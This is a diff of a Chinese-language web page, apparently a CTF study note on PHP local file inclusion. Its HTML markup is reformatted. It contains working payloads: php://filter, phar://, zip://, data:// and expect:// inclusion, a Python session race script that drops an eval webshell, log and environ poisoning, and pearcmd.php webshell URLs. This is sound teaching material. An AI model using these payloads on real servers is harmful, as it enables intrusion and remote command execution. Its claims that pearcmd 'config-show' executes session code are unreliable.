+<td>任何没有以 read= 或 write= 作前缀的筛选器列表<strong>会视情况应用于读或写链</strong>。</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p>注：</p>
 <ul>
 <li><code>read</code> 和 <code>write</code> 指令是互斥的，不能同时使用。</li>
 <li>如果存在多个过滤器，字符串从左到右的顺序经过过滤器</li>
 </ul>
-<h6 id="常用过滤语句"><a href="#常用过滤语句" class="headerlink" title="常用过滤语句"></a>常用过滤语句</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?file=php://filter/read=convert.base64-encode/resource=/flag //读取根目录flag文件，进行base64编码<br></code></pre></td></tr></table></figure>
-
-<h6 id="常用过滤器-未完"><a href="#常用过滤器-未完" class="headerlink" title="常用过滤器(未完)"></a>常用过滤器(未完)</h6><p>字符串过滤器</p>
+<h6 id="常用过滤语句"><a class="markdownIt-Anchor" href="#常用过滤语句"></a> 常用过滤语句</h6>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?file=php://filter/read=convert.base64-encode/resource=/flag //读取根目录flag文件，进行base64编码<br></code></pre></td></tr></table></figure>
+<h6 id="常用过滤器未完"><a class="markdownIt-Anchor" href="#常用过滤器未完"></a> 常用过滤器(未完)</h6>
+<p>字符串过滤器</p>
 <p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.string.php">PHP: 字符串过滤器 - Manual</a></p>
 <ul>
 <li><code>string.rot13</code>（对字符串执行<code>ROT13</code>编码转换）</li>
@@ -211,11 +241,14 @@
 <p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.convert.php">PHP: 转换过滤器 - Manual</a></p>
 <p>注：转换过滤器是 PHP 5.0.0 添加的</p>
 <ul>
-<li><p><strong>常用</strong>：<strong><code>convert.base64-encode</code><strong>和</strong><code>convert.base64-decode</code></strong>（将字符串进行base64编码加解密）</p>
+<li>
+<p><strong>常用</strong>：<strong><code>convert.base64-encode</code><strong>和</strong><code>convert.base64-decode</code></strong>（将字符串进行base64编码加解密）</p>
 </li>
-<li><p><code>convert.quoted-printable-encode</code> 和 <code>convert.quoted-printable-decode</code>（将字符串进行Quoted-printable编码加解密）</p>
+<li>
+<p><code>convert.quoted-printable-encode</code> 和 <code>convert.quoted-printable-decode</code>（将字符串进行Quoted-printable编码加解密）</p>
 </li>
-<li><p><code>convert.iconv.*</code>（将字符串进行字符编码转化）</p>
+<li>
+<p><code>convert.iconv.*</code>（将字符串进行字符编码转化）</p>
 </li>
 </ul>
 <blockquote>
@@ -233,52 +266,69 @@
 <li>长于 <strong>76 个字符</strong> 的行必须 <strong>换行</strong>，并在行尾加 <code>=</code> 作为软换行</li>
 </ul>
 </blockquote>
-<h4 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h4><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><p>php版本大于等于php5.3.0<br><code>allow_url_fopen = On</code><br><code>allow_url_include = On</code></p>
-<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p><code>phar://</code> 是用来解压的伪协议</p>
+<h4 id="phar"><a class="markdownIt-Anchor" href="#phar"></a> phar://</h4>
+<h5 id="利用条件"><a class="markdownIt-Anchor" href="#利用条件"></a> 利用条件</h5>
+<p>php版本大于等于php5.3.0<br />
+<code>allow_url_fopen = On</code><br />
+<code>allow_url_include = On</code></p>
+<h5 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h5>
+<p><code>phar://</code> 是用来解压的伪协议</p>
 <p><code>phar://</code>不管参数中是什么拓展名，都会被当做压缩包</p>
-<h5 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h5><p><code>?file=phar://压缩包/压缩文件</code></p>
-<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p><code>phar://xxx.png/shell.php</code></p>
-<p>写一个木马文件<code>shell.php</code>，然后用<code>zip://</code>伪协议压缩成<code>shell.zip</code>，最后修改后缀名为<code>.png</code>，上传图片<br>输入测试：<code>http://www.abc.com/xxx/file.php?file=phar://shell.png/shell.php</code></p>
+<h5 id="用法"><a class="markdownIt-Anchor" href="#用法"></a> 用法</h5>
+<p><code>?file=phar://压缩包/压缩文件</code></p>
+<h5 id="示例"><a class="markdownIt-Anchor" href="#示例"></a> 示例</h5>
+<p><code>phar://xxx.png/shell.php</code></p>
+<p>写一个木马文件<code>shell.php</code>，然后用<code>zip://</code>伪协议压缩成<code>shell.zip</code>，最后修改后缀名为<code>.png</code>，上传图片<br />
+输入测试：<code>http://www.abc.com/xxx/file.php?file=phar://shell.png/shell.php</code></p>
 <p>这样<code>phar://</code>就会将png当做zip压缩包进行解压，并且访问解压后的<code>shell.php</code>文件</p>
-<h4 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h4><h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><p>php版本大于等于php5.3.0<br><code>allow_url_fopen = On</code><br><code>allow_url_include = On</code></p>
+<h4 id="zip"><a class="markdownIt-Anchor" href="#zip"></a> zip://</h4>
+<h5 id="利用条件-2"><a class="markdownIt-Anchor" href="#利用条件-2"></a> 利用条件</h5>
+<p>php版本大于等于php5.3.0<br />
+<code>allow_url_fopen = On</code><br />
+<code>allow_url_include = On</code></p>
 <p>和<code>phar://</code>伪协议原理类似，但用法不同</p>
-<h5 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h5><p><code>?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</code></p>
+<h5 id="用法-2"><a class="markdownIt-Anchor" href="#用法-2"></a> 用法</h5>
+<p><code>?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</code></p>
 <p>注意：需要将#转换成URL编码：<code>%23</code></p>
-<p> <code>zip://</code> &amp; <code>bzip2://</code> &amp; <code>zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，<strong>更重要的是不需要指定后缀名，可修改为任意后缀</strong>：jpg、png、gif等等。</p>
+<p><code>zip://</code> &amp; <code>bzip2://</code> &amp; <code>zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，<strong>更重要的是不需要指定后缀名，可修改为任意后缀</strong>：jpg、png、gif等等。</p>
 <p><strong>注</strong>：<code>zlib://</code> 需要是服务器内的压缩包文件、但不局限于后缀名</p>
-<h5 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h5><p>1.<code>zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</code></p>
+<h5 id="示例-2"><a class="markdownIt-Anchor" href="#示例-2"></a> 示例</h5>
+<p>1.<code>zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</code></p>
 <p>压缩 <code>phpinfo.txt</code> 为 <code>phpinfo.zip</code> ，压缩包重命名为 <code>phpinfo.jpg</code> ，并上传目录<code>/var/www/html/</code>，以file为文件包含的参数为例：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?file=zip:///var/www/html/phpinfo.jpg#phpinfo.txt<br></code></pre></td></tr></table></figure>
-
 <p>2.<code>compress.bzip2://file.bz2</code></p>
 <p>压缩 <code>phpinfo.txt</code> 为 <code>phpinfo.bz2</code> 并上传(同样支持任意后缀名)，并上传目录<code>/var/www/html/</code>，以file为文件包含的参数为例：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?file=compress.bzip2:///var/www/html/phpinfo.bz2<br></code></pre></td></tr></table></figure>
-
 <p>3.<code>compress.zlib://file.gz</code></p>
 <p>压缩 <code>phpinfo.txt</code> 为 <code>phpinfo.gz</code> 并上传(同样支持任意后缀名)，并上传目录<code>/var/www/html/</code>，以file为文件包含的参数为例：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?file=compress.zlib:///var/www/html/phpinfo.gz<br></code></pre></td></tr></table></figure>
-
-<h4 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h4><h5 id="条件-5"><a href="#条件-5" class="headerlink" title="条件"></a>条件</h5><p>php版本大于等于php5.2<br><code>allow_url_fopen = On</code><br><code>allow_url_include = On</code></p>
-<h5 id="用法-2"><a href="#用法-2" class="headerlink" title="用法"></a>用法</h5><ul>
+<h4 id="data"><a class="markdownIt-Anchor" href="#data"></a> data://</h4>
+<h5 id="条件-6"><a class="markdownIt-Anchor" href="#条件-6"></a> 条件</h5>
+<p>php版本大于等于php5.2<br />
+<code>allow_url_fopen = On</code><br />
+<code>allow_url_include = On</code></p>
+<h5 id="用法-3"><a class="markdownIt-Anchor" href="#用法-3"></a> 用法</h5>
+<ul>
 <li><code>data://text/plain,[加上所需传输的经过url编码数据]</code></li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;<br></code></pre></td></tr></table></figure>
-
 <ul>
 <li><code>data://text/plain;base64,[加上所需传输的经过base64编码再经过url编码的数据]</code></li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b<br></code></pre></td></tr></table></figure>
-
 <p>注：加号 + 的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8%2b</code>的base64解码为： <code>&lt;?php phpinfo();?&gt;</code></p>
-<h4 id="expect"><a href="#expect" class="headerlink" title="expect:&#x2F;&#x2F;"></a>expect:&#x2F;&#x2F;</h4><p>PHP要安装<code>expect</code>扩展</p>
+<h4 id="expect"><a class="markdownIt-Anchor" href="#expect"></a> expect://</h4>
+<p>PHP要安装<code>expect</code>扩展</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://example.com/index.php?file=php:expect://id<br>http://example.com/index.php?file=php:expect://ls<br></code></pre></td></tr></table></figure>
-
-<h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e6f59f3f01b8">Session文件包含漏洞-简书</a></p>
-<h4 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h4><p>session文件路径已知，且其中内容部分可控</p>
+<h3 id="包含session"><a class="markdownIt-Anchor" href="#包含session"></a> 包含session</h3>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e6f59f3f01b8">Session文件包含漏洞-简书</a></p>
+<h4 id="利用条件-3"><a class="markdownIt-Anchor" href="#利用条件-3"></a> 利用条件</h4>
+<p>session文件路径已知，且其中内容部分可控</p>
 <p><strong>过滤了点</strong>之后不能使用文件包含来getshell了，能利用无后缀的文件session，利用<code>session.upload_progress</code>来进行文件包含，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>参数</p>
-<h4 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h4><h5 id="一些配置选项"><a href="#一些配置选项" class="headerlink" title="一些配置选项"></a>一些配置选项</h5><p>该功能是在php5.4添加的，首先先了解下php.ini以下的几个默认选项</p>
+<h4 id="基础知识-2"><a class="markdownIt-Anchor" href="#基础知识-2"></a> 基础知识</h4>
+<h5 id="一些配置选项"><a class="markdownIt-Anchor" href="#一些配置选项"></a> 一些配置选项</h5>
+<p>该功能是在php5.4添加的，首先先了解下php.ini以下的几个默认选项</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">session.upload_progress.enable = on<br>session.upload_progress.cleanup = on<br>session.upload_progress.prefix = &quot;upload_progress_&quot;<br>session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;<br></code></pre></td></tr></table></figure>
-
 <ul>
 <li><code>enable = on</code>表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</li>
 <li><code>cleanup = on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；<strong>cleanup选项决定了我们需要条件竞争</strong></li>
@@ -288,86 +338,107 @@
 <p><code>session.auto_start</code>：默认为off，若为on，php会在接收请求的时候会自动初始化Session，不再需要执行<code>session_start()</code></p>
 <p><code>session.use_strict_mode</code>：默认值为0，此时用户可以自定义Sesssion ID（默认情况下，PHP允许**任何客户端使用 <code>PHPSESSID</code> 发送请求并恢复会话，**如果攻击者提前猜测或设置了<code>PHPSESSID</code>，则可能劫持用户的会话），比如，我们在Cookie里设置<code>PHPSESSID=ROIS</code>，PHP将会在服务器上创建一个文件<code>/tmp/sess_ROIS</code>。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有<code>ini.get(“session.upload_progress.prefix”)</code>+由我们构造的<code>session.upload_progress.name</code>值组成，最后被写入sess_文件里</p>
 <p>注：由于<code>cleanup=on</code>，会导致文件上传后，session文件的内容立即清空。此时我们得利用条件竞争，在session文件的内容被清空前进行文件包含</p>
-<h5 id="常见的php-session存放位置"><a href="#常见的php-session存放位置" class="headerlink" title="常见的php-session存放位置"></a>常见的php-session存放位置</h5><ul>
+<h5 id="常见的php-session存放位置"><a class="markdownIt-Anchor" href="#常见的php-session存放位置"></a> 常见的php-session存放位置</h5>
+<ul>
 <li><code>/var/lib/php/sess_PHPSESSID</code></li>
 <li><code>/var/lib/php/sessions/sess_PHPSESSID</code></li>
 <li><code>/tmp/sess_PHPSESSID</code></li>
 <li><code>/tmp/sessions/sess_PHPSESSID</code></li>
 </ul>
-<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>python脚本</p>
+<h4 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h4>
+<p>python脚本</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import io<br>import sys<br>import requests<br>import threading<br><br>sessid = &#x27;Qftm&#x27;<br><br>def POST(session):<br>    while True:<br>        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)<br>        session.post(<br>            &#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/&#x27;,<br>            data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;&lt;?php system(&#x27;cat *&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[mtfQ])?&gt;&#x27;);?&gt;&quot;&#125;,<br>            files=&#123;&quot;file&quot;:(&#x27;q.txt&#x27;, f)&#125;,<br>            cookies=&#123;&#x27;PHPSESSID&#x27;:sessid&#125;<br>        )<br><br>def READ(session):<br>    while True:<br>        response = session.get(f&#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/?file=/tmp/sess_&#123;sessid&#125;&#x27;)<br>        if &#x27;flag&#x27; not in response.text:<br>            print(&#x27;[+++]retry&#x27;)<br>        else:<br>            print(response.text)<br>            sys.exit(0)<br><br><br>with requests.session() as session:<br>    t1 = threading.Thread(target=POST, args=(session, ))<br>    t1.daemon = True<br>    t1.start()<br><br>    READ(session)<br><br></code></pre></td></tr></table></figure>
-
-<h3 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h3><h4 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h4><h5 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h5><p>需要知道服务器日志的存储路径，且日志文件可读</p>
-<h5 id="日志位置"><a href="#日志位置" class="headerlink" title="日志位置"></a>日志位置</h5><p>nginx：<code>/var/log/nginx/access.log</code></p>
+<h3 id="包含日志"><a class="markdownIt-Anchor" href="#包含日志"></a> 包含日志</h3>
+<h4 id="访问日志"><a class="markdownIt-Anchor" href="#访问日志"></a> 访问日志</h4>
+<h5 id="利用条件-4"><a class="markdownIt-Anchor" href="#利用条件-4"></a> 利用条件</h5>
+<p>需要知道服务器日志的存储路径，且日志文件可读</p>
+<h5 id="日志位置"><a class="markdownIt-Anchor" href="#日志位置"></a> 日志位置</h5>
+<p>nginx：<code>/var/log/nginx/access.log</code></p>
 <p>apache：<code>/var/log/apache2/access_log(access.log)</code></p>
 <p>注：在CTF中，log的地址常被修改掉，可以通过读取相应的配置文件后，再进行包含</p>
-<h5 id="payload插入"><a href="#payload插入" class="headerlink" title="payload插入"></a>payload插入</h5><p>位置：User-Agent头，GET参数</p>
+<h5 id="payload插入"><a class="markdownIt-Anchor" href="#payload插入"></a> payload插入</h5>
+<p>位置：User-Agent头，GET参数</p>
 <p>User-Agent头不需要抓包解码，GET参数需要。</p>
 <p>最后getshell即可</p>
-<h4 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h4><p>SSH（Secure Shell）是一种加密协议，主要用于远程安全登录和服务器管理</p>
-<h5 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h5><p>需要知道ssh-log的位置，且可读。默认情况下为<code>/var/log/auth.log</code></p>
-<p>ubuntu中：<code>ssh &#39;&lt;?php phpinfo(); ?&gt;&#39;@remotehost</code></p>
-<p>之后会提示输入密码等等，随便输入。<br>然后在remotehost的ssh-log中即可写入php代码</p>
-<h3 id="包含environ（环境变量）"><a href="#包含environ（环境变量）" class="headerlink" title="包含environ（环境变量）"></a>包含environ（环境变量）</h3><h4 id="利用条件-5"><a href="#利用条件-5" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+<h4 id="ssh-log"><a class="markdownIt-Anchor" href="#ssh-log"></a> SSH log</h4>
+<p>SSH（Secure Shell）是一种加密协议，主要用于远程安全登录和服务器管理</p>
+<h5 id="利用条件-5"><a class="markdownIt-Anchor" href="#利用条件-5"></a> 利用条件</h5>
+<p>需要知道ssh-log的位置，且可读。默认情况下为<code>/var/log/auth.log</code></p>
+<p>ubuntu中：<code>ssh '&lt;?php phpinfo(); ?&gt;'@remotehost</code></p>
+<p>之后会提示输入密码等等，随便输入。<br />
+然后在remotehost的ssh-log中即可写入php代码</p>
+<h3 id="包含environ环境变量"><a class="markdownIt-Anchor" href="#包含environ环境变量"></a> 包含environ（环境变量）</h3>
+<h4 id="利用条件-6"><a class="markdownIt-Anchor" href="#利用条件-6"></a> 利用条件</h4>
+<ul>
 <li>php以cgi方式运行，这样environ才会保持UA头。</li>
 <li>environ文件存储位置已知，且environ文件可读。</li>
 </ul>
-<h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><p>如果一个 Web 服务器有 LFI（本地文件包含）漏洞，但 <code>php://filter</code>、<code>log poisoning</code> 都不可用，那么 <code>/proc/self/environ</code> 可能是最后的希望</p>
-<p>如果目标服务器运行 PHP，并且 <code>$_SERVER[&#39;HTTP_USER_AGENT&#39;]</code> 被写入环境变量，可以尝试在 <code>User-Agent</code> 头中注入恶意代码：</p>
+<h4 id="利用-2"><a class="markdownIt-Anchor" href="#利用-2"></a> 利用</h4>
+<p>如果一个 Web 服务器有 LFI（本地文件包含）漏洞，但 <code>php://filter</code>、<code>log poisoning</code> 都不可用，那么 <code>/proc/self/environ</code> 可能是最后的希望</p>
+<p>如果目标服务器运行 PHP，并且 <code>$_SERVER['HTTP_USER_AGENT']</code> 被写入环境变量，可以尝试在 <code>User-Agent</code> 头中注入恶意代码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GET /?file=/proc/self/environ HTTP/1.1<br>Host: target.com<br>User-Agent: &lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;<br></code></pre></td></tr></table></figure>
-
 <p>然后访问<code>http://target.com/?file=/proc/self/environ&amp;cmd=whoami</code></p>
-<h3 id="包含fd"><a href="#包含fd" class="headerlink" title="包含fd"></a>包含fd</h3><p>跟包含environ类似</p>
-<h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p>同样要竞争</p>
-<h3 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h3><p>配合文件上传漏洞，基本原理不变</p>
-<h3 id="包含pearcmd"><a href="#包含pearcmd" class="headerlink" title="包含pearcmd"></a>包含pearcmd</h3><p><code>pearcmd.php</code> 是 <strong>PHP PEAR（PHP Extension and Application Repository）</strong> 的命令行管理工具，如果服务器存在 <strong>本地文件包含（LFI）漏洞</strong>，可以通过包含 <code>pearcmd.php</code> 并传参来执行任意 PHP 代码，从而实现 <strong>远程命令执行（RCE）</strong></p>
-<h4 id="pearcmd-php-可能的路径"><a href="#pearcmd-php-可能的路径" class="headerlink" title="pearcmd.php 可能的路径"></a><code>pearcmd.php</code> 可能的路径</h4><h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/usr/share/php/pearcmd.php<br>/usr/local/lib/php/pearcmd.php<br>/var/www/html/pear/pearcmd.php<br></code></pre></td></tr></table></figure>
-
-<h5 id="Windows（XAMPP）"><a href="#Windows（XAMPP）" class="headerlink" title="Windows（XAMPP）"></a>Windows（XAMPP）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">C:\xampp\php\PEAR\pearcmd.php<br></code></pre></td></tr></table></figure>
-
-<h4 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h4><h6 id="直接包含-pearcmd-php-进行-RCE"><a href="#直接包含-pearcmd-php-进行-RCE" class="headerlink" title="直接包含 pearcmd.php 进行 RCE"></a>直接包含 <code>pearcmd.php</code> 进行 RCE</h6><p>如果服务器有 LFI 漏洞，可以直接访问：</p>
+<h3 id="包含fd"><a class="markdownIt-Anchor" href="#包含fd"></a> 包含fd</h3>
+<p>跟包含environ类似</p>
+<h3 id="包含临时文件"><a class="markdownIt-Anchor" href="#包含临时文件"></a> 包含临时文件</h3>
+<p>同样要竞争</p>
+<h3 id="包含上传文件"><a class="markdownIt-Anchor" href="#包含上传文件"></a> 包含上传文件</h3>
+<p>配合文件上传漏洞，基本原理不变</p>
+<h3 id="包含pearcmd"><a class="markdownIt-Anchor" href="#包含pearcmd"></a> 包含pearcmd</h3>
+<p><code>pearcmd.php</code> 是 <strong>PHP PEAR（PHP Extension and Application Repository）</strong> 的命令行管理工具，如果服务器存在 <strong>本地文件包含（LFI）漏洞</strong>，可以通过包含 <code>pearcmd.php</code> 并传参来执行任意 PHP 代码，从而实现 <strong>远程命令执行（RCE）</strong></p>
+<h4 id="pearcmdphp-可能的路径"><a class="markdownIt-Anchor" href="#pearcmdphp-可能的路径"></a> <code>pearcmd.php</code> 可能的路径</h4>
+<h5 id="linux"><a class="markdownIt-Anchor" href="#linux"></a> Linux</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/usr/share/php/pearcmd.php<br>/usr/local/lib/php/pearcmd.php<br>/var/www/html/pear/pearcmd.php<br></code></pre></td></tr></table></figure>
+<h5 id="windowsxampp"><a class="markdownIt-Anchor" href="#windowsxampp"></a> Windows（XAMPP）</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">C:\xampp\php\PEAR\pearcmd.php<br></code></pre></td></tr></table></figure>
+<h4 id="利用-3"><a class="markdownIt-Anchor" href="#利用-3"></a> 利用</h4>
+<h6 id="直接包含-pearcmdphp-进行-rce"><a class="markdownIt-Anchor" href="#直接包含-pearcmdphp-进行-rce"></a> 直接包含 <code>pearcmd.php</code> 进行 RCE</h6>
+<p>如果服务器有 LFI 漏洞，可以直接访问：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://target.com/index.php?file=/usr/share/php/pearcmd.php<br></code></pre></td></tr></table></figure>
-
 <p>然后使用 <code>+config-create+</code> 写入 Webshell：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://target.com/index.php?file=/usr/share/php/pearcmd.php&amp;+config-create+/var/www/html+&lt;?=system($_GET[&#x27;cmd&#x27;]);?&gt;+.php<br></code></pre></td></tr></table></figure>
-
 <p><strong>这将在 <code>/var/www/html/.php</code> 生成 Webshell</strong>，然后访问：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://target.com/.php?cmd=id<br></code></pre></td></tr></table></figure>
-
 <p>即可执行系统命令</p>
-<h6 id="结合-php-input-进行代码执行"><a href="#结合-php-input-进行代码执行" class="headerlink" title="结合 php://input 进行代码执行"></a>结合 <code>php://input</code> 进行代码执行</h6><p>如果服务器 <code>allow_url_include=On</code>，可以：</p>
+<h6 id="结合-phpinput-进行代码执行"><a class="markdownIt-Anchor" href="#结合-phpinput-进行代码执行"></a> 结合 <code>php://input</code> 进行代码执行</h6>
+<p>如果服务器 <code>allow_url_include=On</code>，可以：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://target.com/index.php?file=php://input<br></code></pre></td></tr></table></figure>
-
 <p>然后用 <code>POST</code> 发送：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php system(&#x27;id&#x27;); ?&gt;<br></code></pre></td></tr></table></figure>
-
 <p>如果 <code>pearcmd.php</code> 存在，也可以利用：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://target.com/index.php?file=/usr/share/php/pearcmd.php&amp;+config-show<br></code></pre></td></tr></table></figure>
-
 <p>这样 <code>pearcmd.php</code> 可能会解析 <strong>session</strong> 或 <strong>临时文件</strong>，执行恶意代码</p>
-<h6 id="结合-session-auto-start-进行代码执行"><a href="#结合-session-auto-start-进行代码执行" class="headerlink" title="结合 session.auto_start 进行代码执行"></a>结合 <code>session.auto_start</code> 进行代码执行</h6><p>如果 <code>session.auto_start=1</code>，可以将恶意代码写入 <code>$_SESSION</code>，然后通过 <code>pearcmd.php</code> 解析：</p>
+<h6 id="结合-sessionauto_start-进行代码执行"><a class="markdownIt-Anchor" href="#结合-sessionauto_start-进行代码执行"></a> 结合 <code>session.auto_start</code> 进行代码执行</h6>
+<p>如果 <code>session.auto_start=1</code>，可以将恶意代码写入 <code>$_SESSION</code>，然后通过 <code>pearcmd.php</code> 解析：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php<br>session_start();<br>$_SESSION[&#x27;payload&#x27;] = &quot;&lt;?php system(&#x27;id&#x27;); ?&gt;&quot;;<br>?&gt;<br></code></pre></td></tr></table></figure>
-
 <p>然后访问：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://target.com/index.php?file=/usr/share/php/pearcmd.php&amp;+config-show<br></code></pre></td></tr></table></figure>
-
 <p>可能会解析 <code>$_SESSION</code> 并执行 <code>payload</code> 代码</p>
-<h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><h3 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h3><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p><code>../</code>可以进行目录遍历</p>
-<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>有时把点号过滤了，尝试编码点号</p>
